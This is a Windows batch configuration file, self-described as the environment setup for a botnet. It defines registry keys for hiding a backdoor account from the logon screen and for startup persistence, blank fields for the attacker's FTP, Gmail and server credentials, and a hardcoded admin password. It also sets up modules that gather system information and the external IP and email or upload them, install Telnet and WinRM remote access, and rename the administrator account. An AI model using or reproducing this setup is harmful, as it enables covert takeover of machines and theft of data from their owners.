echo on
Rem Set of System Environment Variable for Botnet
rem
rem
rem == SYSTEM CONSTANTS and VARIABLES ==
rem
rem +> Constants
rem
set curdir=%CD%
set Win_Logon=MSSQLSR
set Key_Var=HKLM\SYSTEM\ControlSet001\Control\Session Manager\Environment
set Key_Invisible=HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList\%Win_Logon%
set Key_Run=HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
rem Password for Local SuperUser
set sys_pwd=
rem Variable for Temporary Initialization script For FTP client
set CommFTP=
rem
rem => Variables
rem
rem ===> Ports For sTUnnel Service
rem Ports for Gmail
set t_smtpport=4925
set t_imapport=4143
rem Ports For Hacker User 1 (If need)
set t_hu1_ftp=
set t_hu1_http=
rem Ports For Hacker User 2 (if need)
set t_hu2_ftp=
set t_hu2_http=
rem <===
rem ==> Ports and ip's for System Proxy Server (if need)
set sys_prx=
set sys_ipv4=
set sys_ipv6=
set sys_prxusr=
set sys_prxpsw=
rem <===
rem ++++++++> All Computers requires  to be set this variables!
rem Login And Password of Hackers FTP Server
set Hacker_User=
set Hacker_Pass=
Rem Login %Hemail_User%@gmail.com and Password of Hackers Gmail Server
set Hemail_User= 
set Hemail_Pass=
rem Domains or IP's for Haker's Server. First is Public, Second is Private
set Hacker_Host1=
set Hacker_Host2=
set Win_Passwd=Admin01234
rem <++++++++
rem ==> Some Rechangable Package Variables ==
rem
rem
rem ==> Yuden Exponenta Package
rem
set PUB1=C:\pub1
rem
rem ===> Elevation Package
rem
set ELEVATION=C:\Elevation
rem
rem
rem
rem == PACKAGES ==
rem
rem => Elevation
rem
set Dest_DIR=%ELEVATION%
set manifest=%ELEVATION%\Elevation.newmanifest
set Log_Path=%TEMP%
set Log_File=Elevation.log
set Param=ELEVATION
rem
rem => Hidden Start
rem
set Dest_DIR=C:\Program Files\Hidden Start
set manifest="C:\Program Files\Hidden Start\hstart.newmanifest"
set Log_Path=%TEMP%
set Log_File=Hstart.log
rem
rem => chocolatey
rem Nothing
rem
rem => sTunnel
rem Nothing
rem
rem
rem => Admin Scripts
rem Nothing
rem
rem => YUDEN Exponenta
rem
rem It Uses files onload_regedit, onsysload, sendfile,
rem Required: curl, wget
set Dest_DIR=%PUB1%\Util
set Data_DIR=%PUB1%\backup
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\Exponenta.newmanifest
set Log_Path=%TEMP%
set Log_File=Exponenta.log
set Param=PUB1
rem
rem ==> Blat
rem
rem Files sendEmail.bat 
set Dest_DIR=%PUB1%\Blat
set Data_DIR=%PUB1%\Blat
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\Blat\Blat.newmanifest
set Log_Path=%Misc_DIR%
set Log_File=Blat.log
rem
rem ==> ExtIP Module
rem
rem Files getExtIP.bat sendExtIP1.bat emailExtIP.bat
set Dest_DIR=%PUB1%\Util
set Data_DIR=%PUB1%\backup
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\ExtIP.newmanifest
set Log_Path=%Misc_DIR%
set Log_File=ExtIP.log
rem
rem ==> SysInf Module
rem 
rem Files GetSystemInfo..bat SendSystemInfo.bat emailSystemInfo.bat
set Dest_DIR=%PUB1%\Util
set Data_DIR=%PUB1%\backup
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\SysInf.newmanifest
set Log_Path=%Misc_DIR%
set Log_File=SysInf.log
rem
rem ==> TelnetServerInst Module
rem 
set Dest_DIR=%PUB1%\Util
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\TelnetServerInst.newmanifest
set Log_Path=%Misc_DIR%
set Log_File=TelnetServerInst.log
rem
rem
rem ==> WinRMServiceInst Module
rem 
set Dest_DIR=%PUB1%\Util
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\WinRMServiceInst.newmanifest
set Log_Path=%Misc_DIR%
set Log_File=WinRMServiceInst.log
rem
rem ==> RenameAdmin Module
rem 
set Dest_DIR=%PUB1%\Util
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\RenameAdmin.newmanifest
set Log_Path=%Misc_DIR%
set Log_File=RenameAdmin.log
rem
rem ==> InstallModules Module
rem
rem It Uses files module_load.bat, module_setload.bat, module_setsend.bat module_setrun.bat module_setmail.bat
set Dest_DIR=%PUB1%\Util
set Data_DIR=%PUB1%\backup
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\InstallModules.newmanifest
set Log_Path=%TEMP%
set Log_File=Exponenta.log
rem
rem ==> GetTimeReload Module
rem
rem It Uses files  getdatetime.bat
set Dest_DIR=%PUB1%\Util
set Data_DIR=%PUB1%\backup
set Misc_DIR=%PUB1%\Misc
set manifest=%PUB1%\GetTimeReload.newmanifest
set Log_Path=%TEMP%
set Log_File=GetTimeReload.log
rem
